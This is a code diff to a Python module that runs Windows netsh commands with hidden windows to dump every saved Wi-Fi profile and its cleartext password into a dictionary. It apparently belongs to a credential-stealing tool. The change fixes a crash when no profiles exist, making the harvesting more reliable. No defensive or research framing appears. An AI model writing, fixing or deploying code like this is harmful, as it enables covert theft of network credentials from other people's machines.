@@ -1,4 +1,7 @@
-from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, PIPE, check_output
+# Do not change subprocess.run to subprocess.check_output
+# It will throw an exception when there is no Wifi profiles
+
+from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, run
 from re import findall, search
 from os import environ
 from preferences.config import config
@@ -9,14 +12,14 @@ def Wifi():
     logs = []
     startupinfo = STARTUPINFO()
     startupinfo.dwFlags |= STARTF_USESHOWWINDOW
-    profiles_output = check_output(['netsh', 'wlan', 'show', 'profiles'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
-    profile_names = findall(':\s(.+)', profiles_output)
+    profiles_output = run(['netsh', 'wlan', 'show', 'profiles'], shell=True, capture_output=True, text=True, startupinfo=startupinfo)
+    profile_names = findall(':\s(.+)', profiles_output.stdout)
 
     wifi_passwords = {}
 
     for profile in profile_names:
-        password_output = check_output(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, stdin=PIPE, stderr=PIPE, startupinfo=startupinfo)
-        password = search('Key Content\s+:\s(.+)', str(password_output))
+        password_output = run(['netsh', 'wlan', 'show', 'profile', 'name=' + profile, 'key=clear'], shell=True, text=True, capture_output=True, startupinfo=startupinfo)
+        password = search('Key Content\s+:\s(.+)', password_output.stdout)
 
         if password:
             wifi_passwords[profile] = password.group(1)
